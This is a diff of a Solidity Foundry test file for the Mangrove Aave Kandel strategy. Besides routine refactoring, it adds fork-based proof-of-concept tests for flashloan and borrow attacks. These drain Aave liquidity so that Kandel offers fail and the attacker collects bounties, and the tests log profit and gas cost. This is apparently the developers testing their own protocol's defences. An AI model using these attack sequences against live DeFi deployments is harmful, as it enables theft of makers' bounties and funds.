@@ -2,6 +2,7 @@
 pragma solidity ^0.8.10;
 
 import {CoreKandelTest, IERC20} from "./CoreKandel.t.sol";
+import {console} from "forge-std/Test.sol";
 import {TestToken} from "mgv_test/lib/tokens/TestToken.sol";
 import {AaveKandel, AavePooledRouter} from "mgv_src/strategies/offer_maker/market_making/kandel/AaveKandel.sol";
 import {PinnedPolygonFork} from "mgv_test/lib/forks/Polygon.sol";
@@ -12,6 +13,7 @@ import {console2} from "forge-std/Test.sol";
 import {MgvReader} from "mgv_src/periphery/MgvReader.sol";
 import {AbstractRouter} from "mgv_src/strategies/routers/AbstractRouter.sol";
 import {PoolAddressProviderMock} from "mgv_script/toy/AaveMock.sol";
+import {AaveCaller} from "mgv_test/lib/agents/AaveCaller.sol";
 
 contract AaveKandelTest is CoreKandelTest {
   PinnedPolygonFork fork;
@@ -20,10 +22,15 @@ contract AaveKandelTest is CoreKandelTest {
   bool useForkAave = true;
   address aave;
 
+  receive() external payable {}
+
   function __setForkEnvironment__() internal override {
     if (useForkAave) {
       fork = new PinnedPolygonFork();
       fork.setUp();
+      options.gasprice = 90;
+      options.gasbase = 68_000;
+      options.defaultFee = 30;
       mgv = setupMangrove();
       reader = new MgvReader($(mgv));
       base = TestToken(fork.get("WETH"));
@@ -39,10 +46,10 @@ contract AaveKandelTest is CoreKandelTest {
   function __deployKandel__(address deployer, address id) internal virtual override returns (GeometricKandel) {
     // 474_000 theoretical in mock up of router
     // 218_000 observed in tests of router
-    uint router_gasreq = 318 * 1000;
-    uint kandel_gasreq = 338 * 1000;
+    uint router_gasreq = 500 * 1000;
+    uint kandel_gasreq = 160 * 1000;
     router = address(router) == address(0) ? new AavePooledRouter(aave, router_gasreq) : router;
-    aaveKandel = new AaveKandel({
+    AaveKandel aaveKandel_ = new AaveKandel({
       mgv: IMangrove($(mgv)),
       base: base,
       quote: quote,
@@ -51,12 +58,12 @@ contract AaveKandelTest is CoreKandelTest {
       reserveId: id
     });
 
-    router.bind(address(aaveKandel));
+    router.bind(address(aaveKandel_));
     // Setting AaveRouter as Kandel's router and activating router on BASE and QUOTE ERC20
-    aaveKandel.initialize(router);
-    aaveKandel.setAdmin(deployer);
-    assertEq(aaveKandel.offerGasreq(), kandel_gasreq + router_gasreq, "Incorrect gasreq");
-    return aaveKandel;
+    aaveKandel_.initialize(router);
+    aaveKandel_.setAdmin(deployer);
+    assertEq(aaveKandel_.offerGasreq(), kandel_gasreq + router_gasreq, "Incorrect gasreq");
+    return aaveKandel_;
   }
 
   function precisionForAssert() internal pure override returns (uint) {
@@ -149,7 +156,7 @@ contract AaveKandelTest is CoreKandelTest {
     uint quoteAave = router.overlying(quote).balanceOf(address(router));
     vm.prank($(mgv));
     kdl.makerPosthook(order, result);
-    assertEq(kdl.reserveBalance(Bid), makerBalance + 1000 * 10 ** 6, "Incorrect updated balance");
+    assertApproxEqAbs(kdl.reserveBalance(Bid), makerBalance, 1, "Maker balance should be invariant");
     assertEq(base.balanceOf(address(router)), 0, "Router did not flush base buffer");
     assertEq(quote.balanceOf(address(router)), 0, "Router did not flush quote buffer");
     assertEq(
@@ -157,9 +164,10 @@ contract AaveKandelTest is CoreKandelTest {
       baseAave + 1 ether,
       "Router should have supplied its base buffer on AAVE"
     );
-    assertEq(
+    assertApproxEqAbs(
       router.overlying(quote).balanceOf(address(router)),
       quoteAave + 1000 * 10 ** 6,
+      1,
       "Router should have supplied maker's quote on AAVE"
     );
   }
@@ -174,7 +182,7 @@ contract AaveKandelTest is CoreKandelTest {
     uint quoteBalance = kdl.reserveBalance(Bid);
 
     vm.prank(maker);
-    kdl.depositFunds(dynamic([IERC20(base), quote]), dynamic([uint(baseAmount), quoteAmount]));
+    kdl.depositFunds(baseAmount, quoteAmount);
 
     assertEq(kdl.reserveBalance(Ask), kdl_.reserveBalance(Ask), "funds are not shared");
     assertEq(kdl.reserveBalance(Bid), kdl_.reserveBalance(Bid), "funds are not shared");
@@ -183,7 +191,7 @@ contract AaveKandelTest is CoreKandelTest {
   }
 
   function test_offerLogic_sharingLiquidityBetweenStratsNoDonation_offersSucceedAndFundsPushedToAave() public {
-    test_offerLogic_sharingLiquidityBetweenStrats_offersSucceedAndFundsPushedToAave({
+    offerLogic_sharingLiquidityBetweenStrats_offersSucceedAndFundsPushedToAave({
       donationMultiplier: 0,
       allBaseOnAave: true,
       allQuoteOnAave: true
@@ -191,7 +199,7 @@ contract AaveKandelTest is CoreKandelTest {
   }
 
   function test_offerLogic_sharingLiquidityBetweenStratsFirstOfferDonated_offersSucceedAndPushesBaseToAave() public {
-    test_offerLogic_sharingLiquidityBetweenStrats_offersSucceedAndFundsPushedToAave({
+    offerLogic_sharingLiquidityBetweenStrats_offersSucceedAndFundsPushedToAave({
       donationMultiplier: 1,
       allBaseOnAave: true,
       allQuoteOnAave: false
@@ -199,14 +207,14 @@ contract AaveKandelTest is CoreKandelTest {
   }
 
   function test_offerLogic_sharingLiquidityBetweenStratsBothOffersDonated_offersSucceedAndNoFundsPushedToAave() public {
-    test_offerLogic_sharingLiquidityBetweenStrats_offersSucceedAndFundsPushedToAave({
+    offerLogic_sharingLiquidityBetweenStrats_offersSucceedAndFundsPushedToAave({
       donationMultiplier: 3,
       allBaseOnAave: false,
       allQuoteOnAave: false
     });
   }
 
-  function test_offerLogic_sharingLiquidityBetweenStrats_offersSucceedAndFundsPushedToAave(
+  function offerLogic_sharingLiquidityBetweenStrats_offersSucceedAndFundsPushedToAave(
     uint donationMultiplier,
     bool allBaseOnAave,
     bool allQuoteOnAave
@@ -256,9 +264,134 @@ contract AaveKandelTest is CoreKandelTest {
     GeometricKandel kdl_ = __deployKandel__(maker, address(0));
     assertTrue(kdl_.RESERVE_ID() != kdl.RESERVE_ID(), "Strats should not have the same reserveId");
     vm.prank(maker);
-    kdl.depositFunds(dynamic([IERC20(base), quote]), dynamic([uint(baseAmount), quoteAmount]));
+    kdl.depositFunds(baseAmount, quoteAmount);
 
     assertEq(kdl_.reserveBalance(Ask), 0, "funds should not be shared");
     assertEq(kdl_.reserveBalance(Bid), 0, "funds should not be shared");
+  }
+
+  function executeAttack(uint offerId) public {
+    // context base should not be available to redeem for the router, for this attack to succeed
+    (,, uint takerGave, uint bounty,) =
+      mgv.snipes($(base), $(quote), wrap_dynamic([offerId, 0.1 ether, type(uint96).max, type(uint).max]), true);
+    require(takerGave == 0 && bounty > 0, "attack failed");
+  }
+
+  function test_liquidity_flashloan_attack() public {
+    AaveCaller attacker = new AaveCaller(fork.get("Aave"), 2);
+    deal($(quote), address(this), 1 ether);
+    quote.approve({spender: address(mgv), amount: type(uint).max});
+    attacker.setCallbackAddress(address(this));
+    uint gas = gasleft();
+    uint bestAsk = mgv.best($(base), $(quote));
+    bytes memory cd = abi.encodeWithSelector(this.executeAttack.selector, bestAsk);
+    uint assetSupply = attacker.get_supply(base);
+    uint nativeBalance = address(this).balance;
+    try attacker.flashloan(base, assetSupply - 1, cd) {
+      gas = gas - gasleft();
+      assertTrue(true, "Flashloan attack succeeded!");
+      console.log("Total profit of the attack:", toUnit(address(this).balance - nativeBalance, 18));
+      console.log("Gas cost:", gas);
+    } catch {
+      assertTrue(false, "Flashloan attack failed");
+    }
+  }
+
+  function test_liquidity_borrow_snipe_attack() public {
+    // base is weth and has a borrow cap, so trying the attack on quote
+    address dai = fork.get("DAI");
+    AaveCaller attacker = new AaveCaller(fork.get("Aave"), 2);
+    deal($(base), address(this), 1 ether);
+    base.approve({spender: address(mgv), amount: type(uint).max});
+    uint quoteSupply = attacker.get_supply(quote); // quote in 6 decimals
+    // mocking up a big flashloan of usdc
+    deal(dai, address(attacker), quoteSupply * 2 * 10 ** 12); // dai has 18 decimals
+    attacker.approveLender(IERC20(dai));
+    attacker.supply(IERC20(dai), quoteSupply * 2 * 10 ** 12);
+    uint nativeBal = address(this).balance;
+    uint gas = gasleft(); // adding flash loan overhead
+    try attacker.borrow(quote, quoteSupply - 1) {
+      (,, uint takerGave, uint bounty,) = sellToBestAs(address(this), 0.1 ether);
+      require(takerGave == 0 && bounty > 0, "Attack failed");
+      gas = gas - gasleft() + 300_000; // adding flashloan cost
+      console.log(
+        "Attack successful, %s collected for an overhead of %s gas units",
+        toUnit(address(this).balance - nativeBal, 18),
+        gas
+      );
+      (MgvStructs.GlobalPacked global,) = mgv.config(address(0), address(0));
+      uint attacker_cost = gas * global.gasprice() * 10 ** 9;
+      console.log("Gas cost of the attack: %s native tokens", toUnit(attacker_cost, 18));
+    } catch Error(string memory reason) {
+      console.log(reason);
+    }
+  }
+
+  function test_liquidity_borrow_marketOrder_attack() public {
+    /// adding as many offers as possible (adding more will stack overflow when failing offer will cascade)
+    deployOtherKandel(0.1 ether, 100 * 10 ** 6, uint24(1001 * 10 ** kdl.PRECISION() / 1000), 1, 150);
+    //printOrderBook($(quote), $(base));
+    // base is weth and has a borrow cap, so trying the attack on quote
+    address dai = fork.get("DAI");
+    AaveCaller attacker = new AaveCaller(fork.get("Aave"), 2);
+    deal($(base), address(this), 1 ether);
+    base.approve({spender: address(mgv), amount: type(uint).max});
+    uint quoteSupply = attacker.get_supply(quote); // quote in 6 decimals
+    // mocking up a big flashloan of usdc
+    deal(dai, address(attacker), quoteSupply * 140 * 10 ** 10); // dai has 18 decimals
+    attacker.approveLender(IERC20(dai));
+    attacker.supply(IERC20(dai), quoteSupply * 140 * 10 ** 10);
+    uint gas = gasleft(); // adding flash loan overhead
+    try attacker.borrow(quote, quoteSupply - 1) {
+      // borrow is ~180K
+      (, uint takerGave, uint bounty,) = mgv.marketOrder({
+        outbound_tkn: $(quote),
+        inbound_tkn: $(base),
+        takerWants: 10,
+        takerGives: 1 ether,
+        fillWants: false
+      });
+
+      require(takerGave == 0 && bounty > 0, "Attack failed");
+      gas = gas - gasleft() + 400_000; // adding flashloan cost + repay of borrow
+      console.log("Attack successful, %s collected for an overhead of %s gas units", toUnit(bounty, 18), gas);
+      (MgvStructs.GlobalPacked global, MgvStructs.LocalPacked local) = mgv.config($(base), $(quote));
+      console.log("Gasbase is ", local.offer_gasbase());
+      uint attacker_cost = gas * global.gasprice() * 10 ** 9;
+      console.log(
+        "Gas cost of the attack (gasprice %s gwei): %s native tokens", global.gasprice(), toUnit(attacker_cost, 18)
+      );
+    } catch Error(string memory reason) {
+      console.log(reason);
+    }
+    printOrderBook($(quote), $(base));
+  }
+
+  function test_cannot_create_aaveKandel_with_aToken_for_base() public {
+    AaveCaller attacker = new AaveCaller(fork.get("Aave"), 2);
+    IERC20 aToken = attacker.overlying(base);
+    vm.expectRevert("AaveKandel/cannotTradeAToken");
+    new AaveKandel({
+      mgv: IMangrove($(mgv)),
+      base: aToken,
+      quote: quote,
+      gasreq: 100,
+      gasprice: 0,
+      reserveId: address(0)
+    });
+  }
+
+  function test_cannot_create_aaveKandel_with_aToken_for_quote() public {
+    AaveCaller attacker = new AaveCaller(fork.get("Aave"), 2);
+    IERC20 aToken = attacker.overlying(quote);
+    vm.expectRevert("AaveKandel/cannotTradeAToken");
+    new AaveKandel({
+      mgv: IMangrove($(mgv)),
+      base: base,
+      quote: aToken,
+      gasreq: 100,
+      gasprice: 0,
+      reserveId: address(0)
+    });
   }
 }
